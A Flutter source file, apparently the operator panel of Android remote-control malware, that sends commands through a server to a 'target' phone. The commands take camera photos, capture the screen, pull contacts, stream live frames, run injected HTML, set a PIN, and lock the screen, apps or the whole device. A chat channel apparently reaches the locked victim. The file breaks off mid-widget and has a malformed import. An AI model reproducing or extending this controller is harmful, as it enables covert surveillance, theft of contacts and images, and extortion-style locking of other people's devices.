import 'dart:async';
import 'dart:convert';
import 'dart:math';  // <-- ADDED: Fix for Random class
import 'dart:typed_data';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:url_launcher/url_launcher.dart';
import '.dart';

// ─────────────────────────────────────────────────────────────────────────────
// THEME MODERN - GLASSMORPHISM NEON + SILVER DARK CHROME
// ─────────────────────────────────────────────────────────────────────────────
class AppTheme {
  static const Color background = Color(0xFF080C1A);
  static const Color surface = Color(0xFF0F1A2E);
  static const Color surfaceLight = Color(0xFF182A44);
  static const Color card = Color(0xFF13203A);
  static const Color border = Color(0xFF1A3A5C);
  
  static const Color textPrimary = Color(0xFFE8F4FD);
  static const Color textSecondary = Color(0xFF7AB8D4);
  static const Color textMuted = Color(0xFF3A6A8A);
  
  // Neon Colors
  static const Color neonBlue = Color(0xFF00B4FF);
  static const Color neonCyan = Color(0xFF00E5FF);
  static const Color neonGreen = Color(0xFF00E676);
  static const Color neonTeal = Color(0xFF00BFA5);
  static const Color neonDeepBlue = Color(0xFF2962FF);
  static const Color neonRed = Color(0xFFFF1744);
  static const Color neonOrange = Color(0xFFFF9100);
  static const Color neonPurple = Color(0xFF7C4DFF);
  static const Color neonPink = Color(0xFFFF4081);
  static const Color neonYellow = Color(0xFFFFEA00);
  static const Color neonLime = Color(0xFFC6FF00);
  
  // ── SILVER DARK CHROME THEME ──
  static const Color silverDark = Color(0xFF2C2C2E);
  static const Color silverLight = Color(0xFF8E8E93);
  static const Color silverGlow = Color(0xFFD1D1D6);
  static const Color silverMetallic = Color(0xFFAEAEB2);
  static const Color silverChrome = Color(0xFFF2F2F7);
  static const Color silverDarkBg = Color(0xFF1C1C1E);
  static const Color silverBorder = Color(0xFF3A3A3C);
  
  // ── GRADIENTS ──
  static LinearGradient gradientBlue = const LinearGradient(
    colors: [neonBlue, neonCyan],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );
  
  static LinearGradient gradientGreen = const LinearGradient(
    colors: [neonGreen, neonTeal],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );
  
  static LinearGradient gradientRed = const LinearGradient(
    colors: [neonRed, neonOrange],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );
  
  static LinearGradient gradientPurple = const LinearGradient(
    colors: [neonPurple, neonPink],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );
  
  // ── SILVER GRADIENT ──
  static LinearGradient gradientSilver = LinearGradient(
    colors: [silverDark, silverLight, silverGlow, silverLight, silverDark],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
    stops: const [0.0, 0.3, 0.5, 0.7, 1.0],
  );
  
  static LinearGradient gradientSilverDark = LinearGradient(
    colors: [silverDark, silverDarkBg, silverDark],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );
  
  static BoxShadow glowSilver = BoxShadow(
    color: silverGlow.withOpacity(0.3),
    blurRadius: 30,
    spreadRadius: 5,
  );
  
  static BoxShadow glowSilverIntense = BoxShadow(
    color: silverGlow.withOpacity(0.5),
    blurRadius: 40,
    spreadRadius: 8,
  );
  
  static BoxShadow glow(Color color, {double blur = 25}) => BoxShadow(
    color: color.withOpacity(0.3),
    blurRadius: blur,
    spreadRadius: 2,
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// GLOWING WIDGET
// ─────────────────────────────────────────────────────────────────────────────
class GlowingWidget extends StatefulWidget {
  final Widget child;
  final Color color;
  final double intensity;
  final bool isSilver;
  
  const GlowingWidget({
    super.key, 
    required this.child, 
    required this.color, 
    this.intensity = 1.0,
    this.isSilver = false,
  });

  @override
  State<GlowingWidget> createState() => _GlowingWidgetState();
}

class _GlowingWidgetState extends State<GlowingWidget> with SingleTickerProviderStateMixin {
  late AnimationController _controller;
  late Animation<double> _animation;

  @override
  void initState() {
    super.initState();
    _controller = AnimationController(vsync: this, duration: const Duration(milliseconds: 1500));
    _animation = Tween<double>(begin: 0.3, end: 1.0).animate(
      CurvedAnimation(parent: _controller, curve: Curves.easeInOut),
    );
    _controller.repeat(reverse: true);
  }

  @override
  void dispose() {
    _controller.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: _animation,
      builder: (context, child) {
        Color glowColor = widget.color;
        double blur = 25 * _animation.value;
        double spread = 3 * _animation.value;
        
        if (widget.isSilver) {
          // Silver glow effect - lebih menyala
          return Container(
            decoration: BoxDecoration(
              boxShadow: [
                BoxShadow(
                  color: AppTheme.silverGlow.withOpacity(_animation.value * 0.4 * widget.intensity),
                  blurRadius: blur * 1.5,
                  spreadRadius: spread * 2,
                ),
                BoxShadow(
                  color: AppTheme.silverLight.withOpacity(_animation.value * 0.2 * widget.intensity),
                  blurRadius: blur * 2,
                  spreadRadius: spread * 1.5,
                ),
                BoxShadow(
                  color: Colors.white.withOpacity(_animation.value * 0.1 * widget.intensity),
                  blurRadius: blur * 3,
                  spreadRadius: spread * 2,
                ),
              ],
            ),
            child: widget.child,
          );
        }
        
        return Container(
          decoration: BoxDecoration(
            boxShadow: [
              BoxShadow(
                color: widget.color.withOpacity(_animation.value * 0.4 * widget.intensity),
                blurRadius: blur,
                spreadRadius: spread,
              ),
              BoxShadow(
                color: widget.color.withOpacity(_animation.value * 0.15 * widget.intensity),
                blurRadius: blur * 2,
                spreadRadius: spread * 2,
              ),
            ],
          ),
          child: widget.child,
        );
      },
      child: widget.child,
    );
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// SILVER GLOWING CONTAINER
// ─────────────────────────────────────────────────────────────────────────────
class SilverContainer extends StatelessWidget {
  final Widget child;
  final double intensity;
  final EdgeInsets padding;
  
  const SilverContainer({
    super.key,
    required this.child,
    this.intensity = 1.0,
    this.padding = const EdgeInsets.all(16),
  });

  @override
  Widget build(BuildContext context) {
    return GlowingWidget(
      color: AppTheme.silverGlow,
      intensity: intensity,
      isSilver: true,
      child: Container(
        padding: padding,
        decoration: BoxDecoration(
          gradient: AppTheme.gradientSilverDark,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(
            color: AppTheme.silverGlow.withOpacity(0.3),
            width: 1.5,
          ),
          boxShadow: [
            AppTheme.glowSilver,
            BoxShadow(
              color: AppTheme.silverGlow.withOpacity(0.1),
              blurRadius: 20,
              spreadRadius: 2,
            ),
          ],
        ),
        child: child,
      ),
    );
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// MAIN PAGE
// ─────────────────────────────────────────────────────────────────────────────
class ControlCenterPage extends StatefulWidget {
  final Map<String, dynamic>? targetDevice;
  final String role;
  
  const ControlCenterPage({super.key, this.targetDevice, this.role = 'owner'});

  @override
  State<ControlCenterPage> createState() => _ControlCenterPageState();
}

class _ControlCenterPageState extends State<ControlCenterPage> with SingleTickerProviderStateMixin {
  
  String get _deviceId => widget.targetDevice?['id']?.toString() ?? 'unknown';
  String get _deviceModel => widget.targetDevice?['model']?.toString() ?? 'VIVO V2419';
  String get _battery => widget.targetDevice?['battery']?.toString() ?? '87';

  bool _isLoading = false;
  
  // Lock States
  bool _isScreenLocked = false;
  bool _isAppLocked = false;
  bool _isLockLiveActive = false;
  bool _isDeviceLocked = false;
  String _lockedApp = '';
  
  // Display effects
  int _selectedEffect = 0;
  bool _greenLines = false;
  bool _strobe = false;
  bool _darkScreen = false;
  bool _flashOn = false;
  
  // Live
  bool _isLive = false;
  Uint8List? _liveFrame;
  Timer? _liveTimer;
  int _fps = 0;
  
  // Chat
  final List<Map<String, String>> _chatMessages = [];
  final TextEditingController _chatController = TextEditingController();
  final ScrollController _chatScrollController = ScrollController();
  Timer? _chatPollTimer;
  
  // Device Info
  String _currentBattery = '87';
  String _currentModel = 'VIVO V2419';
  Timer? _deviceInfoTimer;

  @override
  void initState() {
    super.initState();
    _currentBattery = _battery;
    _currentModel = _deviceModel;
    _checkAllStatus();
    _chatPollTimer = Timer.periodic(const Duration(seconds: 3), (_) => _pollChat());
    _deviceInfoTimer = Timer.periodic(const Duration(seconds: 10), (_) => _updateDeviceInfo());
  }

  @override
  void dispose() {
    _liveTimer?.cancel();
    _chatPollTimer?.cancel();
    _deviceInfoTimer?.cancel();
    _chatController.dispose();
    _chatScrollController.dispose();
    super.dispose();
  }

  void _showToast(String msg, {Color color = AppTheme.neonCyan}) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(msg, style: const TextStyle(fontWeight: FontWeight.w600, fontSize: 13)),
        backgroundColor: color,
        duration: const Duration(seconds: 2),
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
        margin: const EdgeInsets.all(12),
      ),
    );
  }

  Future<void> _updateDeviceInfo() async {
    if (_deviceId == 'unknown') return;
    try {
      final res = await http.get(
        Uri.parse('$BaseUrl/api/device-info/$_deviceId')
      ).timeout(const Duration(seconds: 5));
      if (res.statusCode == 200 && mounted) {
        final data = jsonDecode(res.body);
        setState(() {
          _currentBattery = data['battery']?.toString() ?? _currentBattery;
          _currentModel = data['model']?.toString() ?? _currentModel;
        });
      }
    } catch (_) {}
  }

  Future<void> _sendCommand(String cmd, {String extra = '', bool silent = false}) async {
    if (_deviceId == 'unknown') {
      if (!silent) _showToast('⚠ Target ID tidak valid');
      return;
    }
    if (!mounted) return;
    setState(() => _isLoading = true);
    try {
      final res = await http.post(
        Uri.parse('$BaseUrl/api/send-command'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'id': _deviceId, 'command': cmd, 'extra': extra}),
      ).timeout(const Duration(seconds: 15));
      
      if (res.statusCode == 200) {
        if (!silent) _showToast('✓ Command terkirim', color: AppTheme.neonGreen);
        await _checkAllStatus();
      } else {
        if (!silent) _showToast('✗ Target offline', color: AppTheme.neonRed);
      }
    } catch (e) {
      if (!silent) _showToast('⚠ Koneksi gagal', color: AppTheme.neonOrange);
    } finally {
      if (mounted) setState(() => _isLoading = false);
    }
  }

  Future<void> _checkAllStatus() async {
    await _checkLockStatus();
    await _checkAppLockStatus();
    await _checkLockLiveStatus();
    await _checkDeviceLockStatus();
  }

  Future<void> _checkLockStatus() async {
    if (_deviceId == 'unknown') return;
    try {
      final res = await http.get(
        Uri.parse('$BaseUrl/api/lock-status/$_deviceId')
      ).timeout(const Duration(seconds: 4));
      if (res.statusCode == 200 && mounted) {
        final data = jsonDecode(res.body);
        setState(() => _isScreenLocked = data['locked'] == true);
      }
    } catch (_) {}
  }

  Future<void> _checkAppLockStatus() async {
    if (_deviceId == 'unknown') return;
    try {
      final res = await http.get(
        Uri.parse('$BaseUrl/api/app-lock-status/$_deviceId')
      ).timeout(const Duration(seconds: 4));
      if (res.statusCode == 200 && mounted) {
        final data = jsonDecode(res.body);
        setState(() {
          _isAppLocked = data['locked'] == true;
          _lockedApp = data['app']?.toString() ?? '';
        });
      }
    } catch (_) {}
  }

  Future<void> _checkLockLiveStatus() async {
    if (_deviceId == 'unknown') return;
    try {
      final res = await http.get(
        Uri.parse('$BaseUrl/api/lock-live-status/$_deviceId')
      ).timeout(const Duration(seconds: 4));
      if (res.statusCode == 200 && mounted) {
        final data = jsonDecode(res.body);
        setState(() => _isLockLiveActive = data['active'] == true);
      }
    } catch (_) {}
  }

  Future<void> _checkDeviceLockStatus() async {
    if (_deviceId == 'unknown') return;
    try {
      final res = await http.get(
        Uri.parse('$BaseUrl/api/device-lock-status/$_deviceId')
      ).timeout(const Duration(seconds: 4));
      if (res.statusCode == 200 && mounted) {
        final data = jsonDecode(res.body);
        setState(() => _isDeviceLocked = data['locked'] == true);
      }
    } catch (_) {}
  }

  // ── CHAT ──────────────────────────────────────────────────────────────────
  void _pollChat() async {
    if (_deviceId == 'unknown' || !_isLockLiveActive) return;
    try {
      final res = await http.get(Uri.parse('$BaseUrl/api/lock-chat-all/$_deviceId')).timeout(const Duration(seconds: 4));
      if (res.statusCode == 200 && mounted) {
        final msgs = (jsonDecode(res.body)['messages'] as List? ?? []);
        if (msgs.length != _chatMessages.length) {
          setState(() {
            _chatMessages.clear();
            for (final m in msgs) {
              _chatMessages.add({
                'from': m['from']?.toString() ?? '',
                'text': m['text']?.toString() ?? '',
                'time': m['time']?.toString() ?? '',
              });
            }
          });
          _scrollChat();
        }
      }
    } catch (_) {}
  }

  void _sendChat(String text) async {
    if (text.trim().isEmpty) return;
    _chatController.clear();
    setState(() => _chatMessages.add({
      'from': 'owner',
      'text': text.trim(),
      'time': TimeOfDay.now().format(context),
    }));
    _scrollChat();
    try {
      await http.post(
        Uri.parse('$BaseUrl/api/lock-chat/$_deviceId'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'text': text.trim(), 'from': 'owner'}),
      ).timeout(const Duration(seconds: 5));
    } catch (_) {}
  }

  void _scrollChat() {
    Future.delayed(const Duration(milliseconds: 100), () {
      if (_chatScrollController.hasClients) {
        _chatScrollController.animateTo(
          _chatScrollController.position.maxScrollExtent,
          duration: const Duration(milliseconds: 200),
          curve: Curves.easeOut,
        );
      }
    });
  }

  // ── LIVE ──────────────────────────────────────────────────────────────────
  void _startLive() {
    setState(() => _isLive = true);
    _showToast('● Live stream started', color: AppTheme.neonRed);
    _liveTimer = Timer.periodic(const Duration(milliseconds: 100), (_) async {
      if (!_isLive || !mounted) return;
      try {
        final res = await http.get(
          Uri.parse('$BaseUrl/api/live-frame/$_deviceId')
        ).timeout(const Duration(milliseconds: 800));
        if (res.statusCode == 200 && res.body.isNotEmpty && mounted) {
          final data = jsonDecode(res.body);
          String? frame = data['frame']?.toString() ?? data['image']?.toString();
          if (frame != null && frame.isNotEmpty) {
            String clean = frame.contains(',') ? frame.split(',').last : frame;
            clean = clean.replaceAll(RegExp(r'\s+'), '');
            try {
              final bytes = base64Decode(clean);
              if (bytes.isNotEmpty && mounted) {
                setState(() => _liveFrame = bytes);
              }
            } catch (_) {}
          }
        }
      } catch (_) {}
    });
  }

  void _stopLive() {
    _liveTimer?.cancel();
    setState(() {
      _isLive = false;
      _liveFrame = null;
    });
    _sendCommand('live_stop', silent: true);
    _showToast('○ Live stopped', color: AppTheme.textMuted);
  }

  // ── BUILD ─────────────────────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: AppTheme.background,
      appBar: AppBar(
        backgroundColor: AppTheme.surface,
        elevation: 0,
        systemOverlayStyle: SystemUiOverlayStyle.light,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back_ios_new_rounded, color: AppTheme.textPrimary, size: 20),
          onPressed: () {
            if (_isLive) _stopLive();
            Navigator.pop(context);
          },
        ),
        title: Row(
          children: [
            GlowingWidget(
              color: AppTheme.silverGlow,
              intensity: 0.8,
              isSilver: true,
              child: Container(
                width: 10,
                height: 10,
                decoration: BoxDecoration(
                  gradient: AppTheme.gradientSilver,
                  shape: BoxShape.circle,
                  boxShadow: [
                    AppTheme.glowSilverIntense,
                  ],
                ),
              ),
            ),
            const SizedBox(width: 10),
            Text(
              '■ CONTROL $_currentModel',
              style: const TextStyle(
                color: AppTheme.textPrimary,
                fontSize: 14,
                fontWeight: FontWeight.w700,
                letterSpacing: 0.5,
              ),
            ),
          ],
        ),
        actions: [
          if (_isLoading)
            const Padding(
              padding: EdgeInsets.only(right: 10),
              child: SizedBox(
                width: 18,
                height: 18,
                child: CircularProgressIndicator(strokeWidth: 2, color: AppTheme.silverGlow),
              ),
            ),
          IconButton(
            icon: Icon(Icons.refresh_rounded, color: AppTheme.silverGlow, size: 22),
            onPressed: () => _checkAllStatus(),
          ),
        ],
      ),
      body: SingleChildScrollView(
        padding: const EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            // ── STATUS BAR (Silver Theme) ──
            _buildStatusBar(),
            const SizedBox(height: 16),
            
            // ── LOCK & SECURITY ──
            _buildSectionTitle('LOCK & SECURITY', Icons.security_rounded, AppTheme.neonCyan),
            const SizedBox(height: 10),
            _buildLockSecurityGrid(),
            
            const SizedBox(height: 20),
            
            // ── QUICK ACTIONS ──
            _buildSectionTitle('QUICK ACTIONS', Icons.flash_on_rounded, AppTheme.neonOrange),
            const SizedBox(height: 10),
            _buildQuickActionsGrid(),
            
            const SizedBox(height: 20),
            
            // ── DISPLAY EFFECTS ──
            _buildSectionTitle('DISPLAY EFFECTS', Icons.display_settings_rounded, AppTheme.neonPurple),
            const SizedBox(height: 10),
            _buildDisplayEffects(),
            
            const SizedBox(height: 20),
            
            // ── LIVE STREAM ──
            _buildSectionTitle('LIVE STREAM', Icons.live_tv_rounded, AppTheme.neonRed),
            const SizedBox(height: 10),
            _buildLiveSection(),
            
            const SizedBox(height: 20),
            
            // ── CHAT ──
            if (_isLockLiveActive) _buildChatSection(),
            
            const SizedBox(height: 20),
            
            // ── DANGER ZONE ──
            _buildSectionTitle('DANGER ZONE', Icons.warning_rounded, AppTheme.neonRed),
            const SizedBox(height: 10),
            _buildDangerZone(),
            
            const SizedBox(height: 30),
          ],
        ),
      ),
    );
  }

  Widget _buildStatusBar() {
    return SilverContainer(
      intensity: 0.8,
      padding: const EdgeInsets.all(12),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceAround,
        children: [
          _statusChip('LOCK', _isScreenLocked ? 'ON' : 'OFF', _isScreenLocked ? AppTheme.neonRed : AppTheme.silverGlow),
          _statusChip('APP', _isAppLocked ? 'ON' : 'OFF', _isAppLocked ? AppTheme.neonRed : AppTheme.silverGlow),
          _statusChip('LIVE', _isLockLiveActive ? 'ON' : 'OFF', _isLockLiveActive ? AppTheme.neonRed : AppTheme.silverLight),
          _statusChip('STREAM', _isLive ? 'ON' : 'OFF', _isLive ? AppTheme.neonRed : AppTheme.silverLight),
          _statusChip('BAT', '$_currentBattery%', _currentBattery == '87' ? AppTheme.neonGreen : AppTheme.neonOrange),
        ],
      ),
    );
  }

  Widget _statusChip(String label, String value, Color color) {
    return Column(
      children: [
        Text(label, style: const TextStyle(color: AppTheme.silverLight, fontSize: 7, fontWeight: FontWeight.w600)),
        const SizedBox(height: 2),
        Container(
          padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
          decoration: BoxDecoration(
            color: color.withOpacity(0.1),
            borderRadius: BorderRadius.circular(4),
            border: Border.all(color: color.withOpacity(0.3)),
          ),
          child: Text(
            value,
            style: TextStyle(color: color, fontSize: 7, fontWeight: FontWeight.w700),
          ),
        ),
      ],
    );
  }

  Widget _buildSectionTitle(String title, IconData icon, Color color) {
    return Row(
      children: [
        Container(
          padding: const EdgeInsets.all(6),
          decoration: BoxDecoration(
            gradient: AppTheme.gradientSilver,
            borderRadius: BorderRadius.circular(8),
            boxShadow: [
              AppTheme.glowSilver,
            ],
          ),
          child: Icon(icon, color: AppTheme.silverDarkBg, size: 16),
        ),
        const SizedBox(width: 10),
        Text(
          title,
          style: TextStyle(
            color: AppTheme.silverGlow,
            fontSize: 14,
            fontWeight: FontWeight.w700,
            letterSpacing: 1,
            shadows: [
              Shadow(
                color: AppTheme.silverGlow.withOpacity(0.3),
                blurRadius: 10,
              ),
            ],
          ),
        ),
      ],
    );
  }

  // ── LOCK & SECURITY GRID ──
  Widget _buildLockSecurityGrid() {
    return GridView.count(
      shrinkWrap: true,
      physics: const NeverScrollableScrollPhysics(),
      crossAxisCount: 2,
      crossAxisSpacing: 10,
      mainAxisSpacing: 10,
      childAspectRatio: 1.8,
      children: [
        _buildLockCard(
          'SCREEN',
          _isScreenLocked ? Icons.lock_rounded : Icons.lock_open_rounded,
          _isScreenLocked ? AppTheme.neonRed : AppTheme.silverGlow,
          _isScreenLocked ? '● LOCKED' : '○ UNLOCK',
          _isScreenLocked ? _unlockScreen : _showLockScreenDialog,
        ),
        _buildLockCard(
          'APP',
          _isAppLocked ? Icons.app_blocking_rounded : Icons.apps_rounded,
          _isAppLocked ? AppTheme.neonRed : AppTheme.silverGlow,
          _isAppLocked ? '● $_lockedApp' : '○ UNLOCK',
          _isAppLocked ? _unlockApp : _showLockAppDialog,
        ),
        _buildLockCard(
          'LIVE',
          _isLockLiveActive ? Icons.lock_rounded : Icons.lock_open_rounded,
          _isLockLiveActive ? AppTheme.neonRed : AppTheme.silverGlow,
          _isLockLiveActive ? '● ACTIVE' : '○ OFF',
          _isLockLiveActive ? _unlockLive : _showLockLiveDialog,
        ),
        _buildLockCard(
          'DEVICE',
          _isDeviceLocked ? Icons.lock_outline_rounded : Icons.lock_open_rounded,
          _isDeviceLocked ? AppTheme.neonRed : AppTheme.silverGlow,
          _isDeviceLocked ? '● LOCKED' : '○ UNLOCK',
          _isDeviceLocked ? _unlockDevice : _showLockDeviceDialog,
        ),
      ],
    );
  }

  Widget _buildLockCard(String label, IconData icon, Color color, String status, VoidCallback onTap) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        padding: const EdgeInsets.all(12),
        decoration: BoxDecoration(
          gradient: AppTheme.gradientSilverDark,
          borderRadius: BorderRadius.circular(14),
          border: Border.all(color: color.withOpacity(0.3)),
          boxShadow: [
            BoxShadow(
              color: color.withOpacity(0.1),
              blurRadius: 15,
              spreadRadius: 2,
            ),
          ],
        ),
        child: Row(
          children: [
            GlowingWidget(
              color: color,
              intensity: 0.3,
              isSilver: color == AppTheme.silverGlow,
              child: Icon(icon, color: color, size: 22),
            ),
            const SizedBox(width: 10),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    label,
                    style: TextStyle(
                      color: AppTheme.silverLight,
                      fontSize: 10,
                      fontWeight: FontWeight.w600,
                    ),
                  ),
                  Text(
                    status,
                    style: TextStyle(
                      color: color,
                      fontSize: 10,
                      fontWeight: FontWeight.w700,
                    ),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ── QUICK ACTIONS GRID ──
  Widget _buildQuickActionsGrid() {
    return GridView.count(
      shrinkWrap: true,
      physics: const NeverScrollableScrollPhysics(),
      crossAxisCount: 4,
      crossAxisSpacing: 8,
      mainAxisSpacing: 8,
      childAspectRatio: 0.9,
      children: [
        _buildQuickAction('FLASH', Icons.flash_on_rounded, AppTheme.neonOrange, () {
          setState(() => _flashOn = !_flashOn);
          _sendCommand(_flashOn ? 'flash_strobe' : 'stop_strobe');
        }, _flashOn),
        _buildQuickAction('SOUND', Icons.volume_up_rounded, AppTheme.silverGlow, () => _showInputDialog('Play Sound', 'Sound URL', (v) => _sendCommand('play_audio', extra: v)), false, true),
        _buildQuickAction('HTML', Icons.code_rounded, AppTheme.silverGlow, () => _showInputDialog('HTML Code', 'Enter HTML code', (v) => _sendCommand('run_html', extra: v)), false, true),
        _buildQuickAction('PIN', Icons.pin_rounded, AppTheme.silverGlow, () => _showPinDialog(), false, true),
        _buildQuickAction('CAM', Icons.camera_alt_rounded, AppTheme.silverGlow, () => _showCameraPicker((side) => _sendCommand('take_photo', extra: side)), false, true),
        _buildQuickAction('SCR', Icons.screenshot_monitor_rounded, AppTheme.silverGlow, () => _sendCommand('get_screen'), false, true),
        _buildQuickAction('URL', Icons.open_in_browser_rounded, AppTheme.silverGlow, () => _showInputDialog('Open URL', 'https://...', (v) => _sendCommand('open_url', extra: v)), false, true),
        _buildQuickAction('CON', Icons.contacts_rounded, AppTheme.silverGlow, () => _sendCommand('get_contacts'), false, true),
      ],
    );
  }

  Widget _buildQuickAction(String label, IconData icon, Color color, VoidCallback onTap, [bool isActive = false, bool isSilver = false]) {
    Color activeColor = isSilver ? AppTheme.silverGlow : color;
    Color inactiveColor = isSilver ? AppTheme.silverLight : AppTheme.textSecondary;
    
    return GestureDetector(
      onTap: onTap,
      child: Container(
        padding: const EdgeInsets.symmetric(vertical: 8),
        decoration: BoxDecoration(
          gradient: isActive ? AppTheme.gradientSilverDark : null,
          color: isActive ? null : Colors.transparent,
          borderRadius: BorderRadius.circular(14),
          border: Border.all(
            color: isActive ? activeColor : AppTheme.silverBorder,
            width: isActive ? 2 : 1,
          ),
          boxShadow: isActive ? [
            BoxShadow(
              color: activeColor.withOpacity(0.2),
              blurRadius: 20,
              spreadRadius: 3,
            ),
          ] : null,
        ),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            GlowingWidget(
              color: isActive ? activeColor : inactiveColor,
              intensity: isActive ? 0.5 : 0.2,
              isSilver: isSilver,
              child: Icon(icon, color: isActive ? activeColor : inactiveColor, size: 20),
            ),
            const SizedBox(height: 4),
            Text(
              label,
              style: TextStyle(
                color: isActive ? activeColor : inactiveColor,
                fontSize: 7,
                fontWeight: isActive ? FontWeight.w700 : FontWeight.w500,
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ── DISPLAY EFFECTS ──
  Widget _buildDisplayEffects() {
    final effects = ['5s', '10s', '30s', 'OFF'];
    
    return Column(
      children: [
        Row(
          children: effects.asMap().entries.map((entry) {
            final idx = entry.key;
            final label = entry.value;
            final isSelected = _selectedEffect == idx;
            final color = isSelected ? AppTheme.silverGlow : AppTheme.silverLight;
            
            return Expanded(
              child: GestureDetector(
                onTap: () {
                  setState(() => _selectedEffect = idx);
                  _sendCommand('effect_duration', extra: label);
                  _showToast('Effect: $label', color: AppTheme.silverGlow);
                },
                child: Container(
                  margin: const EdgeInsets.symmetric(horizontal: 4),
                  padding: const EdgeInsets.symmetric(vertical: 12),
                  decoration: BoxDecoration(
                    gradient: isSelected ? AppTheme.gradientSilverDark : null,
                    color: isSelected ? null : Colors.transparent,
                    borderRadius: BorderRadius.circular(14),
                    border: Border.all(
                      color: isSelected ? AppTheme.silverGlow : AppTheme.silverBorder,
                      width: isSelected ? 2 : 1,
                    ),
                    boxShadow: isSelected ? [
                      BoxShadow(
                        color: AppTheme.silverGlow.withOpacity(0.2),
                        blurRadius: 20,
                        spreadRadius: 3,
                      ),
                    ] : null,
                  ),
                  child: Center(
                    child: Text(
                      label,
                      style: TextStyle(
                        color: color,
                        fontWeight: isSelected ? FontWeight.w700 : FontWeight.w500,
                        fontSize: 13,
                      ),
                    ),
                  ),
                ),
              ),
            );
          }).toList(),
        ),
        
        const SizedBox(height: 10),
        
        Row(
          children: [
            _buildEffectAction(
              'GREEN',
              Icons.view_module_rounded,
              AppTheme.neonGreen,
              _greenLines,
              () {
                setState(() => _greenLines = !_greenLines);
                _sendCommand(_greenLines ? 'green_lines_on' : 'green_lines_off');
              },
            ),
            const SizedBox(width: 8),
            _buildEffectAction(
              'RESET',
              Icons.cancel_rounded,
              AppTheme.neonRed,
              false,
              () {
                setState(() {
                  _greenLines = false;
                  _strobe = false;
                  _darkScreen = false;
                  _flashOn = false;
                });
                _sendCommand('reset_effects');
                _showToast('All effects reset', color: AppTheme.silverGlow);
              },
            ),
            const SizedBox(width: 8),
            _buildEffectAction(
              'STROBE',
              Icons.flash_on_rounded,
              AppTheme.neonOrange,
              _strobe,
              () {
                setState(() => _strobe = !_strobe);
                _sendCommand(_strobe ? 'strobe_on' : 'strobe_off');
              },
            ),
          ],
        ),
        
        const SizedBox(height: 10),
        
        // DARKEN SCREEN - Silver Theme
        GestureDetector(
          onTap: () {
            setState(() => _darkScreen = !_darkScreen);
            _sendCommand(_darkScreen ? 'dark_screen_on' : 'dark_screen_off');
          },
          child: Container(
            padding: const EdgeInsets.symmetric(vertical: 14),
            decoration: BoxDecoration(
              gradient: _darkScreen ? AppTheme.gradientSilverDark : null,
              color: _darkScreen ? null : Colors.transparent,
              borderRadius: BorderRadius.circular(14),
              border: Border.all(
                color: _darkScreen ? AppTheme.silverGlow : AppTheme.silverBorder,
                width: _darkScreen ? 2 : 1,
              ),
              boxShadow: _darkScreen ? [
                BoxShadow(
                  color: AppTheme.silverGlow.withOpacity(0.3),
                  blurRadius: 30,
                  spreadRadius: 5,
                ),
                BoxShadow(
                  color: AppTheme.silverGlow.withOpacity(0.1),
                  blurRadius: 50,
                  spreadRadius: 10,
                ),
              ] : null,
            ),
            child: Row(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Icon(
                  Icons.dark_mode_rounded,
                  color: _darkScreen ? AppTheme.silverGlow : AppTheme.silverLight,
                  size: 20,
                ),
                const SizedBox(width: 8),
                Text(
                  'DARKEN SCREEN',
                  style: TextStyle(
                    color: _darkScreen ? AppTheme.silverGlow : AppTheme.silverLight,
                    fontWeight: FontWeight.w600,
                    fontSize: 13,
                  ),
                ),
                if (_darkScreen)
                  Padding(
                    padding: const EdgeInsets.only(left: 8),
                    child: GlowingWidget(
                      color: AppTheme.silverGlow,
                      intensity: 0.8,
                      isSilver: true,
                      child: Container(
                        width: 10,
                        height: 10,
                        decoration: BoxDecoration(
                          gradient: AppTheme.gradientSilver,
                          shape: BoxShape.circle,
                          boxShadow: [
                            AppTheme.glowSilverIntense,
                          ],
                        ),
                      ),
                    ),
                  ),
              ],
            ),
          ),
        ),
      ],
    );
  }

  Widget _buildEffectAction(String label, IconData icon, Color color, bool isActive, VoidCallback onTap) {
    Color activeColor = color;
    Color inactiveColor = AppTheme.silverLight;
    
    return Expanded(
      child: GestureDetector(
        onTap: onTap,
        child: Container(
          padding: const EdgeInsets.symmetric(vertical: 12),
          decoration: BoxDecoration(
            gradient: isActive ? AppTheme.gradientSilverDark : null,
            color: isActive ? null : Colors.transparent,
            borderRadius: BorderRadius.circular(14),
            border: Border.all(
              color: isActive ? activeColor : AppTheme.silverBorder,
              width: isActive ? 2 : 1,
            ),
            boxShadow: isActive ? [
              BoxShadow(
                color: activeColor.withOpacity(0.2),
                blurRadius: 20,
                spreadRadius: 3,
              ),
            ] : null,
          ),
          child: Column(
            children: [
              Icon(
                icon,
                color: isActive ? activeColor : inactiveColor,
                size: 20,
              ),
              const SizedBox(height: 4),
              Text(
                label,
                style: TextStyle(
                  color: isActive ? activeColor : inactiveColor,
                  fontSize: 8,
                  fontWeight: isActive ? FontWeight.w700 : FontWeight.w500,
                ),
